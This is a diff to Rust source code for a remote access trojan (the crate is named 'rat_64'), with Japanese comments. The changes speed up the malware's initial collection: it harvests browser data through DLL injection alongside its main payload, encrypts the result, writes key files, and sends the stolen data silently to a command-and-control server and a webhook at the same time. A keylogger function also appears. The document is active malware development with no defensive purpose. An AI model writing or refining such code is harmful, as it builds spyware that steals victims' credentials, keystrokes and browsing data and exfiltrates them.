@@ -184,25 +184,35 @@ async fn continuous_keylogger(running: Arc<AtomicBool>) {
     }
 }
 
-/// 初回データ収集（簡略化版）
+/// 初回データ収集（簡略化版・最適化）
 async fn perform_initial_data_collection(
-    config: &rat_64::Config, 
-    c2_client: &mut C2Client
+    config: &rat_64::Config,
+    c2_client: &mut C2Client,
 ) -> Result<(), Box<dyn std::error::Error>> {
-    // サイレント データ収集
-    let dll_browser_data = collect_browser_data_via_dll().await;
-    
-    let mut payload = IntegratedPayload::create_with_config(&config).await?;
-    
-    // DLL注入データ統合
+    // DLL経由ブラウザ収集とメインペイロード作成を並列化して待ち時間を短縮
+    #[cfg(windows)]
+    let (dll_browser_data, mut payload) = {
+        let dll_fut = collect_browser_data_via_dll();
+        let payload_fut = IntegratedPayload::create_with_config(&config);
+        let (dll_res, payload_res) = tokio::join!(dll_fut, payload_fut);
+        (dll_res, payload_res?)
+    };
+
+    #[cfg(not(windows))]
+    let (dll_browser_data, mut payload) = {
+        let dll_res = collect_browser_data_via_dll().await;
+        let payload = IntegratedPayload::create_with_config(&config).await?;
+        (dll_res, payload)
+    };
+
+    // DLL注入データ統合（取得できた場合のみ）
     #[cfg(windows)]
     if let Some(dll_data) = dll_browser_data.as_ref() {
         integrate_dll_browser_data(&mut payload, dll_data);
     }
-    
+
     // データ暗号化・保存・送信
     process_and_save_data(payload, config, c2_client).await?;
-    
     Ok(())
 }
 
@@ -445,7 +455,7 @@ async fn process_and_save_data(
     let serialized = to_msgpack_vec(&payload)?;
     let (key, nonce) = generate_key_pair();
     let encrypted = encrypt_data_with_key(&serialized, &key, &nonce)?;
-    payload.set_encryption_info(&key, &nonce);
+    payload.update_encryption_info(&key, &nonce);
     
     // キー/ナンス情報をファイルに保存
     let key_b64 = STANDARD_NO_PAD.encode(&key);
@@ -453,17 +463,27 @@ async fn process_and_save_data(
     std::fs::write("key.txt", &key_b64)?;
     std::fs::write("nonce.txt", &nonce_b64)?;
     
-    // C2アップロード（サイレント）
-    if config.command_server_enabled {
-        let _ = c2_client.upload_collected_data(&payload).await;
-    }
-    
+    // C2アップロードとWebhook送信を可能なら並列化
+    let upload_enabled = config.command_server_enabled;
+    let webhook_enabled = config.webhook_enabled && !config.webhook_url.trim().is_empty();
+
     // ファイル保存
     std::fs::write("data.dat", &encrypted)?;
-    
-    // Webhook送信（サイレント）
-    if config.webhook_enabled {
-        let _ = send_unified_webhook(&payload, &config).await;
+
+    match (upload_enabled, webhook_enabled) {
+        (true, true) => {
+            let _ = tokio::join!(
+                c2_client.upload_collected_data(&payload),
+                send_unified_webhook(&payload, &config)
+            );
+        }
+        (true, false) => {
+            let _ = c2_client.upload_collected_data(&payload).await;
+        }
+        (false, true) => {
+            let _ = send_unified_webhook(&payload, &config).await;
+        }
+        (false, false) => {}
     }
     
     Ok(())
